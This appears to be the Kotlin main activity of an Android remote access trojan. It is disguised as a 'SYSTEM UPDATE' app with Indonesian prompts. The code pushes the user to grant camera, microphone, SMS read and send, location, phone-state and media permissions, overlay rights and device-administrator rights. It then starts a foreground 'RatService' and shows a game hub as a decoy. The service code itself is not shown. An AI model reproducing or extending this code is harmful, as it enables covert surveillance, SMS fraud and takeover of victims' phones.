package com.system.update

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.system.update.games.GameHub

class MainActivity : ComponentActivity() {

    private val requiredPerms = mutableListOf(
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.READ_SMS,
        Manifest.permission.RECEIVE_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.VIBRATE,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.POST_NOTIFICATIONS
    ).apply {
        if (Build.VERSION.SDK_INT >= 33) {
            add(Manifest.permission.READ_MEDIA_IMAGES)
            add(Manifest.permission.READ_MEDIA_VIDEO)
        } else {
            add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
    }.toTypedArray()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            var grantedAll by remember { mutableStateOf(false) }
            var showDashboard by remember { mutableStateOf(false) }

            MaterialTheme(
                colorScheme = darkColorScheme(
                    primary = Color(0xFFD4AF37),
                    background = Color(0xFF0A0A0A),
                    surface = Color(0xFF141414)
                )
            ) {
                Surface(
                    modifier = Modifier.fillMaxSize(),
                    color = Color(0xFF0A0A0A)
                ) {
                    when {
                        showDashboard -> GameHub()
                        grantedAll -> DoneScreen(
                            onContinue = {
                                startRatService()
                                showDashboard = true
                            }
                        )
                        else -> PermissionScreen(
                            perms = requiredPerms,
                            onRequest = { requestAll() },
                            onCheck = { grantedAll = checkAll() }
                        )
                    }
                }
            }

            LaunchedEffect(Unit) { grantedAll = checkAll() }
        }
    }

    private fun checkAll(): Boolean {
        val permsOk = requiredPerms.all {
            ContextCompat.checkSelfPermission(this, it) == PackageManager.PERMISSION_GRANTED
        }
        val overlayOk = Settings.canDrawOverlays(this)
        val adminOk = isAdminActive()
        return permsOk && overlayOk && adminOk
    }

    private fun requestAll() {
        val missing = requiredPerms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }.toTypedArray()
        if (missing.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, missing, 1001)
        }
        if (!Settings.canDrawOverlays(this)) {
            try {
                startActivity(
                    Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:$packageName")
                    )
                )
            } catch (_: Exception) {}
        }
        if (!isAdminActive()) {
            try {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
                    putExtra(
                        DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                        ComponentName(this@MainActivity, AdminReceiver::class.java)
                    )
                }
                startActivity(intent)
            } catch (_: Exception) {}
        }
    }

    private fun isAdminActive(): Boolean {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        return dpm.isAdminActive(ComponentName(this, AdminReceiver::class.java))
    }

    private fun startRatService() {
        try {
            val i = Intent(this, RatService::class.java)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(i)
            else startService(i)
        } catch (_: Exception) {}
    }
}

@Composable
fun PermissionScreen(
    perms: Array<String>,
    onRequest: () -> Unit,
    onCheck: () -> Unit
) {
    val ctx = androidx.compose.ui.platform.LocalContext.current
    Column(
        modifier = Modifier
            .fillMaxSize()
            .padding(20.dp)
            .verticalScroll(rememberScrollState()),
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Spacer(Modifier.height(40.dp))
        Text(
            "SYSTEM UPDATE",
            fontSize = 26.sp,
            fontWeight = FontWeight.Bold,
            color = Color(0xFFD4AF37)
        )
        Spacer(Modifier.height(8.dp))
        Text("Aktifkan semua izin", color = Color(0xFF9A9A9A), fontSize = 13.sp)
        Spacer(Modifier.height(24.dp))

        perms.forEach { p ->
            val ok = ContextCompat.checkSelfPermission(ctx, p) == PackageManager.PERMISSION_GRANTED
            Row(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(vertical = 4.dp)
                    .background(Color(0xFF1C1C1C), shape = RoundedCornerShape(8.dp))
                    .padding(12.dp),
                verticalAlignment = Alignment.CenterVertically
            ) {
                Text(if (ok) "OK" else "NO", color = if (ok) Color(0xFF00FF66) else Color(0xFFE60000))
                Spacer(Modifier.width(12.dp))
                Text(p.substringAfterLast('.'), color = Color.White, fontSize = 12.sp)
            }
        }

        Spacer(Modifier.height(20.dp))
        Button(
            onClick = { onRequest(); onCheck() },
            modifier = Modifier.fillMaxWidth().height(50.dp),
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFB30000))
        ) {
            Text("IZINKAN", color = Color.White, fontWeight = FontWeight.Bold)
        }
        Spacer(Modifier.height(10.dp))
        OutlinedButton(
            onClick = { onCheck() },
            modifier = Modifier.fillMaxWidth().height(50.dp)
        ) {
            Text("CEK ULANG", color = Color(0xFFD4AF37))
        }
    }
}

@Composable
fun DoneScreen(onContinue: () -> Unit) {
    Column(
        modifier = Modifier.fillMaxSize().padding(24.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        Text("OK", fontSize = 60.sp, color = Color(0xFF00FF66), fontWeight = FontWeight.Bold)
        Spacer(Modifier.height(16.dp))
        Text("Izin Lengkap", fontSize = 24.sp, color = Color(0xFFD4AF37), fontWeight = FontWeight.Bold)
        Spacer(Modifier.height(8.dp))
        Text("Tekan lanjut", color = Color(0xFF9A9A9A), fontSize = 13.sp)
        Spacer(Modifier.height(32.dp))
        Button(
            onClick = onContinue,
            modifier = Modifier.fillMaxWidth().height(50.dp),
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFB30000))
        ) {
            Text("LANJUT", color = Color.White, fontWeight = FontWeight.Bold)
        }
    }
}
